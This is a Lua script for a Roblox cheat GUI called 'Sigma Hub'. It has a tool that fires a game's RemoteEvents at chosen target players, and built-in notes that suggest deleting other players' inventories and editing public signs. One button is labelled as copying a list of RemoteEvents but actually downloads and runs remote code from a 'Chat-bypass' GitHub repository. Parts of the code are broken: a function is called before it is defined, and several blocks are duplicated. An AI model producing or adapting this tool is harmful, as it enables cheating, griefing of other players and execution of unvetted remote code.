-- Clear any existing GUI
for _, gui in pairs(game.CoreGui:GetChildren()) do
	if gui.Name == "SigmaHub" then gui:Destroy() end
end

local UIS = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SigmaHub"
ScreenGui.Parent = game.CoreGui
ScreenGui.ResetOnSpawn = false

local function makeRounded(obj, radius)
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, radius)
	corner.Parent = obj
end

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 450, 0, 280)
mainFrame.Position = UDim2.new(0.5, -225, 0.5, -140)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = ScreenGui
makeRounded(mainFrame, 12)

-- Top Bar
local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1, 0, 0, 30)
topBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
topBar.Parent = mainFrame
makeRounded(topBar, 8)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -180, 1, 0)
title.Position = UDim2.new(0, 10, 0, 0)
title.BackgroundTransparency = 1
title.Text = "👑 Sigma Hub"
title.TextSize = 16
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = topBar

local usernameLabel = Instance.new("TextLabel")
usernameLabel.Size = UDim2.new(0, 100, 1, 0)
usernameLabel.Position = UDim2.new(1, -170, 0, 0)
usernameLabel.BackgroundTransparency = 1
usernameLabel.Text = LocalPlayer.Name
usernameLabel.TextSize = 14
usernameLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
usernameLabel.Font = Enum.Font.Gotham
usernameLabel.TextXAlignment = Enum.TextXAlignment.Right
usernameLabel.Parent = topBar

-- Close Button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -30, 0, 0)
closeBtn.BackgroundTransparency = 1
closeBtn.Text = "❌"
closeBtn.TextSize = 14
closeBtn.TextColor3 = Color3.fromRGB(200, 50, 50)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = topBar
closeBtn.MouseButton1Click:Connect(function()
	mainFrame.Visible = false
end)

-- Minimize Button
local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.new(0, 30, 0, 30)
minBtn.Position = UDim2.new(1, -60, 0, 0)
minBtn.BackgroundTransparency = 1
minBtn.Text = "➖"
minBtn.TextSize = 16
minBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
minBtn.Font = Enum.Font.GothamBold
minBtn.Parent = topBar

-- Tab Frame
local tabFrame = Instance.new("ScrollingFrame")
tabFrame.Size = UDim2.new(0, 100, 1, -30)
tabFrame.Position = UDim2.new(0, 0, 0, 30)
tabFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
tabFrame.CanvasSize = UDim2.new(0, 0, 0, 350)
tabFrame.ScrollBarThickness = 4
tabFrame.Parent = mainFrame
makeRounded(tabFrame, 10)

local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Padding = UDim.new(0, 5)
uiListLayout.Parent = tabFrame
uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- Content Frame
local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"
contentFrame.Size = UDim2.new(1, -100, 1, -30)
contentFrame.Position = UDim2.new(0, 100, 0, 30)
contentFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
contentFrame.Parent = mainFrame
makeRounded(contentFrame, 10)

-- Version Label
local versionLabel = Instance.new("TextLabel")
versionLabel.Size = UDim2.new(0, 150, 0, 20)
versionLabel.Position = UDim2.new(0, 5, 1, -20)
versionLabel.BackgroundTransparency = 1
versionLabel.Text = "Version: v0.01 Beta"
versionLabel.TextSize = 13
versionLabel.TextColor3 = Color3.fromRGB(120, 120, 120)
versionLabel.Font = Enum.Font.Gotham
versionLabel.TextXAlignment = Enum.TextXAlignment.Left
versionLabel.Parent = mainFrame

-- Resizing Corner
local resizeCorner = Instance.new("TextButton")
resizeCorner.Size = UDim2.new(0, 15, 0, 15)
resizeCorner.Position = UDim2.new(1, -15, 1, -15)
resizeCorner.BackgroundColor3 = Color3.fromRGB(100,100,100)
resizeCorner.BorderSizePixel = 0
resizeCorner.Text = ""
resizeCorner.Parent = mainFrame
makeRounded(resizeCorner, 4)

local resizing = false
local lastMousePos
local lastFrameSize

resizeCorner.MouseButton1Down:Connect(function()
	resizing = true
	lastMousePos = UIS:GetMouseLocation()
	lastFrameSize = mainFrame.Size
end)

UIS.InputChanged:Connect(function(input)
	if resizing and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = UIS:GetMouseLocation() - lastMousePos
		mainFrame.Size = UDim2.new(
			0, math.max(300, lastFrameSize.X.Offset + delta.X),
			0, math.max(150, lastFrameSize.Y.Offset + delta.Y)
		)
	end
end)

UIS.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		resizing = false
	end
end)

-- K key to toggle
UIS.InputBegan:Connect(function(input, gpe)
	if input.KeyCode == Enum.KeyCode.K and not gpe then
		mainFrame.Visible = not mainFrame.Visible
	end
end)

-- Minimize toggle
local minimized = false
minBtn.MouseButton1Click:Connect(function()
	minimized = not minimized
	tabFrame.Visible = not minimized
	contentFrame.Visible = not minimized
	mainFrame.Size = minimized and UDim2.new(0, 450, 0, 30) or UDim2.new(0, 450, 0, 280)
end)

-- Tab Info
local tabInfo = {
	{"🏠", "Home"},
	{"🧍", "Player"},
	{"🎨", "Visual"},
	{"🎙️", "VoiceChat"},
	{"⚙️", "Settings"},
	{"📜", "Credits"},
	{"🧪", "RemoteTest"},
	{"📓", "Notes"},

}

local tabButtons = {}

for _, tab in ipairs(tabInfo) do
	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -10, 0, 40)
	button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	button.Text = tab[1]
	button.Font = Enum.Font.Gotham
	button.TextSize = 20
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.Name = tab[2] .. "Tab"
	button.Parent = tabFrame
	makeRounded(button, 6)
	tabButtons[tab[2]] = button
end

-- Welcome Screen
local WelcomeFrame = Instance.new("Frame")
WelcomeFrame.Name = "WelcomeFrame"
WelcomeFrame.Size = UDim2.new(1, 0, 1, 0)
WelcomeFrame.BackgroundTransparency = 1
WelcomeFrame.Parent = contentFrame

local welcomeLabel = Instance.new("TextLabel")
welcomeLabel.Size = UDim2.new(1, 0, 0, 50)
welcomeLabel.Position = UDim2.new(0, 0, 0.4, 0)
welcomeLabel.BackgroundTransparency = 1
welcomeLabel.Text = "Welcome to Sigma Hub"
welcomeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
welcomeLabel.Font = Enum.Font.GothamBold
welcomeLabel.TextSize = 20
welcomeLabel.TextXAlignment = Enum.TextXAlignment.Center
welcomeLabel.Parent = WelcomeFrame

-- Template for each tab's frame
local function createTabFrame(name, labelText)
	local frame = Instance.new("Frame")
	frame.Name = name .. "Frame"
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Visible = false
	frame.Parent = contentFrame

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 0, 30)
	label.Position = UDim2.new(0, 10, 0, 10)
	label.BackgroundTransparency = 1
	label.Text = labelText
	label.TextColor3 = Color3.fromRGB(255, 255, 255)
	label.Font = Enum.Font.GothamBold
	label.TextSize = 16
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = frame

	return frame
end

-- Create basic tabs
local HomeFrame = createTabFrame("Home", "Home Tab")
local PlayerFrame = createTabFrame("Player", "Player Tab")
local VisualFrame = createTabFrame("Visual", "Visual Tab")
local VoiceChatFrame = createTabFrame("VoiceChat", "Voice Chat Tab")
local SettingsFrame = createTabFrame("Settings", "Settings Tab")
local CreditsFrame = createTabFrame("Credits", "Credits Tab")

-- Credits info
local creditsInfo = Instance.new("TextLabel")
creditsInfo.Size = UDim2.new(1, -40, 0, 30)
creditsInfo.Position = UDim2.new(0, 20, 0, 50)
creditsInfo.BackgroundTransparency = 1
creditsInfo.Text = "Made by Hayden"
creditsInfo.TextColor3 = Color3.fromRGB(200, 200, 200)
creditsInfo.Font = Enum.Font.Gotham
creditsInfo.TextSize = 14
creditsInfo.TextXAlignment = Enum.TextXAlignment.Left
creditsInfo.Parent = CreditsFrame

local creditsTip = Instance.new("TextLabel")
creditsTip.Size = UDim2.new(1, -40, 0, 30)
creditsTip.Position = UDim2.new(0, 20, 0, 80)
creditsTip.BackgroundTransparency = 1
creditsTip.Text = "💬 Type !admin in chat to unlock admin panel"
creditsTip.TextColor3 = Color3.fromRGB(180, 180, 180)
creditsTip.Font = Enum.Font.Gotham
creditsTip.TextSize = 13
creditsTip.TextXAlignment = Enum.TextXAlignment.Left
creditsTip.Parent = CreditsFrame

-- RemoteEvent Tester Frame
local RemoteTestFrame = Instance.new("Frame")
RemoteTestFrame.Name = "RemoteTestFrame"
RemoteTestFrame.Size = UDim2.new(1, 0, 1, 0)
RemoteTestFrame.BackgroundTransparency = 1
RemoteTestFrame.Visible = false
RemoteTestFrame.Parent = contentFrame

local tutorial = Instance.new("TextLabel")
tutorial.Size = UDim2.new(1, -20, 0, 40)
tutorial.Position = UDim2.new(0, 10, 0, 10)
tutorial.BackgroundTransparency = 1
tutorial.Text = "Enter RemoteEvent and (optional) player name. Hit 'Fire' to test."
tutorial.TextColor3 = Color3.fromRGB(200, 200, 200)
tutorial.Font = Enum.Font.Gotham
tutorial.TextSize = 14
tutorial.TextWrapped = true
tutorial.TextXAlignment = Enum.TextXAlignment.Left
tutorial.Parent = RemoteTestFrame

local remoteInput = Instance.new("TextBox")
remoteInput.PlaceholderText = "RemoteEvent Name (e.g., RagdollEvent)"
remoteInput.Size = UDim2.new(0, 250, 0, 30)
remoteInput.Position = UDim2.new(0, 10, 0, 60)
remoteInput.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
remoteInput.TextColor3 = Color3.fromRGB(255, 255, 255)
remoteInput.Font = Enum.Font.Gotham
remoteInput.TextSize = 14
remoteInput.Text = ""
remoteInput.ClearTextOnFocus = false
makeRounded(remoteInput, 6)
remoteInput.Parent = RemoteTestFrame

local playerInput = Instance.new("TextBox")
playerInput.PlaceholderText = "Target Player (optional)"
playerInput.Size = UDim2.new(0, 200, 0, 30)
playerInput.Position = UDim2.new(0, 270, 0, 60)
playerInput.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
playerInput.TextColor3 = Color3.fromRGB(255, 255, 255)
playerInput.Font = Enum.Font.Gotham
playerInput.TextSize = 14
playerInput.Text = ""
playerInput.ClearTextOnFocus = false
makeRounded(playerInput, 6)
playerInput.Parent = RemoteTestFrame

local fireBtn = Instance.new("TextButton")
fireBtn.Size = UDim2.new(0, 120, 0, 30)
fireBtn.Position = UDim2.new(0, 10, 0, 100)
fireBtn.BackgroundColor3 = Color3.fromRGB(40, 100, 40)
fireBtn.Text = "🔥 Fire"
fireBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
fireBtn.Font = Enum.Font.GothamBold
fireBtn.TextSize = 14
makeRounded(fireBtn, 6)
fireBtn.Parent = RemoteTestFrame

local copyRemotesBtn = Instance.new("TextButton")
copyRemotesBtn.Size = UDim2.new(0, 250, 0, 30)
copyRemotesBtn.Position = UDim2.new(0, 140, 0, 100)
copyRemotesBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
copyRemotesBtn.Text = "📋 Copy All RemoteEvents"
copyRemotesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
copyRemotesBtn.Font = Enum.Font.GothamBold
copyRemotesBtn.TextSize = 13
makeRounded(copyRemotesBtn, 6)
copyRemotesBtn.Parent = RemoteTestFrame

copyRemotesBtn.MouseButton1Click:Connect(function()
	local success, err = pcall(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Xeno1234112/Chat-bypass/refs/heads/main/GUI.lua"))()
	end)
	if success then
		logOutput("✅ RemoteEvent list copied to clipboard!")
	else
		logOutput("⚠️ Failed to load remote scanner: " .. tostring(err))
	end
end)


local outputBox = Instance.new("ScrollingFrame")
outputBox.Size = UDim2.new(1, -20, 0, 100)
outputBox.Position = UDim2.new(0, 10, 0, 140)
outputBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
outputBox.BorderSizePixel = 0
outputBox.CanvasSize = UDim2.new(0, 0, 10, 0)
outputBox.ScrollBarThickness = 4
makeRounded(outputBox, 6)
outputBox.Parent = RemoteTestFrame

local logLayout = Instance.new("UIListLayout")
logLayout.Parent = outputBox
logLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- Function to log messages to the output box
local function logOutput(msg)
	local log = Instance.new("TextLabel")
	log.Size = UDim2.new(1, -10, 0, 20)
	log.BackgroundTransparency = 1
	log.Text = msg
	log.TextColor3 = Color3.fromRGB(180, 180, 180)
	log.Font = Enum.Font.Gotham
	log.TextSize = 13
	log.TextXAlignment = Enum.TextXAlignment.Left
	log.Parent = outputBox
end

-- Fire button functionality
fireBtn.MouseButton1Click:Connect(function()
	local remoteName = remoteInput.Text
	local targetName = playerInput.Text
	local remote = nil

	-- Try to find the RemoteEvent
	for _, v in pairs(ReplicatedStorage:GetDescendants()) do
		if v:IsA("RemoteEvent") and v.Name == remoteName then
			remote = v
			break
		end
	end

	if not remote then
		logOutput("❌ RemoteEvent '" .. remoteName .. "' not found.")
		return
	end

	local targetPlayer = Players:FindFirstChild(targetName)
	local success, err = pcall(function()
		if targetPlayer then
			remote:FireServer(targetPlayer)
			logOutput("✅ Fired '" .. remoteName .. "' at " .. targetPlayer.Name)
		else
			remote:FireServer()
			logOutput("✅ Fired '" .. remoteName .. "' with no player target.")
		end
	end)

	if not success then
		logOutput("⚠️ Error: " .. tostring(err))
	end
end)

-- Tab Switching
for tabName, button in pairs(tabButtons) do
	button.MouseButton1Click:Connect(function()
		for _, frame in ipairs(contentFrame:GetChildren()) do
			if frame:IsA("Frame") then
				frame.Visible = false
			end
		end
		local welcome = contentFrame:FindFirstChild("WelcomeFrame")
		if welcome then
			welcome.Visible = false
		end
		local tabFrame = contentFrame:FindFirstChild(tabName .. "Frame")
		if tabFrame then
			tabFrame.Visible = true
		end
	end)
end
-- Notes Tab
local NotesFrame = Instance.new("Frame")
NotesFrame.Name = "NotesFrame"
NotesFrame.Size = UDim2.new(1, 0, 1, 0)
NotesFrame.BackgroundTransparency = 1
NotesFrame.Visible = false
NotesFrame.Parent = contentFrame

local notesTitle = Instance.new("TextLabel")
notesTitle.Size = UDim2.new(1, 0, 0, 30)
notesTitle.Position = UDim2.new(0, 10, 0, 10)
notesTitle.BackgroundTransparency = 1
notesTitle.Text = "📓 Sigma Hub Notes & Remote Guide"
notesTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
notesTitle.Font = Enum.Font.GothamBold
notesTitle.TextSize = 16
notesTitle.TextXAlignment = Enum.TextXAlignment.Left
notesTitle.Parent = NotesFrame

-- Create Notes Frame (for resizable notes content)
local NotesFrame = Instance.new("Frame")
NotesFrame.Name = "NotesFrame"
NotesFrame.Size = UDim2.new(1, 0, 1, 0)
NotesFrame.BackgroundTransparency = 1
NotesFrame.Visible = false
NotesFrame.Parent = contentFrame

local notesTitle = Instance.new("TextLabel")
notesTitle.Size = UDim2.new(1, 0, 0, 30)
notesTitle.Position = UDim2.new(0, 10, 0, 10)
notesTitle.BackgroundTransparency = 1
notesTitle.Text = "📓 Sigma Hub Notes & Remote Guide"
notesTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
notesTitle.Font = Enum.Font.GothamBold
notesTitle.TextSize = 16
notesTitle.TextXAlignment = Enum.TextXAlignment.Left
notesTitle.Parent = NotesFrame

local notesBox = Instance.new("TextBox")
notesBox.Size = UDim2.new(1, -20, 1, -90) -- Resize with the window
notesBox.Position = UDim2.new(0, 10, 0, 50)
notesBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
notesBox.TextColor3 = Color3.fromRGB(255, 255, 255)
notesBox.TextSize = 14
notesBox.Font = Enum.Font.Code
notesBox.TextWrapped = true
notesBox.TextXAlignment = Enum.TextXAlignment.Left
notesBox.TextYAlignment = Enum.TextYAlignment.Top
notesBox.ClearTextOnFocus = false
notesBox.TextEditable = true
notesBox.MultiLine = true
notesBox.Text = [[-- 🔍 Find All RemoteEvents
for _, v in pairs(game:GetDescendants()) do
    if v:IsA("RemoteEvent") then
        print("RemoteEvent found: " .. v:GetFullName())
    end
end

-- 💡 Useful RemoteEvent Targets
-- RagdollEvent: Usually affects yourself, rarely others
-- ToggleInvisibility: Test with true/false and maybe target
-- DeleteInventory: Removes your tools (test on others)
-- ToolEvent: May give or manage tools
-- VEffect / VipAnimation: Try with no args to see effect
-- SubmitTextEvent / UpdateBoothText: May edit public signs
]]
makeRounded(notesBox, 8)
notesBox.Parent = NotesFrame

-- Scrollable Notes Box
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, -20, 1, -90)  -- Scrolls with the notes area
scrollFrame.Position = UDim2.new(0, 10, 0, 50)
scrollFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
scrollFrame.BorderSizePixel = 0
scrollFrame.CanvasSize = UDim2.new(0, 0, 10, 0)  -- Make it scrollable
scrollFrame.ScrollBarThickness = 6
scrollFrame.Parent = NotesFrame
makeRounded(scrollFrame, 8)

-- Add the TextBox to the scrollable frame
notesBox.Parent = scrollFrame

-- Copy to Clipboard Button
local copyBtn = Instance.new("TextButton")
copyBtn.Size = UDim2.new(0, 150, 0, 30)
copyBtn.Position = UDim2.new(0, 10, 0, 240)
copyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 100)
copyBtn.Text = "📋 Copy to Clipboard"
copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
copyBtn.Font = Enum.Font.GothamBold
copyBtn.TextSize = 14
makeRounded(copyBtn, 6)
copyBtn.Parent = NotesFrame

copyBtn.MouseButton1Click:Connect(function()
	if setclipboard then
		setclipboard(notesBox.Text)
	end
end)

-- Resize Notes Area with Window Size
UIS.InputChanged:Connect(function(input)
	if resizing and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = UIS:GetMouseLocation() - lastMousePos
		mainFrame.Size = UDim2.new(
			0, math.max(300, lastFrameSize.X.Offset + delta.X),
			0, math.max(150, lastFrameSize.Y.Offset + delta.Y)
		)
		-- Adjust NotesBox size based on resize
		notesBox.Size = UDim2.new(1, -20, 1, -90)
		scrollFrame.Size = UDim2.new(1, -20, 1, -90)
	end
end)

